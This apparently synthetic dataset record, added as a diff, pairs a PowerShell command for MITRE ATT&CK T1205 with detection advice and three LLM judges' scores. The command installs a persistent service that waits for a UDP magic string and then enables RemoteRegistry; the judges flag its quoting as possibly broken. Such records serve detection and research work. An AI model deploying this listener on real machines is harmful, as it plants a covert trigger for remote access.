@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $script = @'$udp = New-Object System.Net.Sockets.UdpClient(44444)\n$ep = New-Object System.Net.IPEndPoint([IPAddress]::Any,0)\n$data = $udp.Receive([ref]$ep)\n$msg = [Text.Encoding]::ASCII.GetString($data)\nif($msg -eq ''START:RemoteRegistry''){ Set-Service -Name ''RemoteRegistry'' -StartupType Automatic; Start-Service -Name ''RemoteRegistry'' }\n$udp.Close()\n'@; $path='C:\\ProgramData\\knock-listener.ps1'; Set-Content -Path $path -Value $script -Encoding ASCII; New-Service -Name 'KnockListener' -BinaryPathName \"powershell.exe -ExecutionPolicy Bypass -File `\"$path`\"\" -StartupType Automatic -Description 'Listens for UDP magic packet to enable service'; Start-Service -Name 'KnockListener' }",
+  "explanation": "Creates and starts a Windows service that listens for a UDP magic string 'START:RemoteRegistry' to enable and start the RemoteRegistry service, exemplifying traffic signaling to activate functionality. Detection: alert on creation of new services that run PowerShell, UDP bindings on high ports, and unexpected changes to RemoteRegistry startup type. Requires Administrator privileges; UAC elevation required for New-Service.",
+  "rationale_steps": [
+    "Deploy a persistent knock listener via New-Service.",
+    "On receiving a magic packet, enable and start a disabled service.",
+    "Provide detections for new services and service configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-b8e603f0",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The outer PowerShell command is largely well-formed with balanced braces and quoting, but the here-string’s closing '@' sharing a line and the doubled single quotes inside the here-string introduce minor risks.",
+        "semantic_score": 3,
+        "semantic_justification": "It conceptually implements Traffic Signaling by creating a service that listens for a UDP magic string to trigger RemoteRegistry, but the saved script contains malformed string literals (''...''), and the operation requires admin privileges, making successful execution unlikely as written.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:37:25.439013Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper PowerShell here-string syntax, balanced braces, and valid escaping, though the nested quoting with backtick-escaped quotes in BinaryPathName and double-single-quotes inside the here-string may cause edge-case parsing issues in some environments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 Traffic Signaling by creating a persistent UDP listener service that waits for a specific magic string ('START:RemoteRegistry') to trigger activation of the RemoteRegistry service, which is a textbook port-knocking/magic-packet signaling mechanism used to covertly enable functionality on demand.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T04:06:23.978524Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed PowerShell block with properly balanced braces, parentheses, and correctly escaped double quotes within the service binary path.",
+        "semantic_score": 3,
+        "semantic_justification": "While the logic for traffic signaling is clear, the use of doubled single quotes inside a literal here-string (@' ... '@) results in an invalid PowerShell script being written to disk; additionally, a script running a blocking UDP receive will cause a service start timeout in Windows.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T04:06:33.709753Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
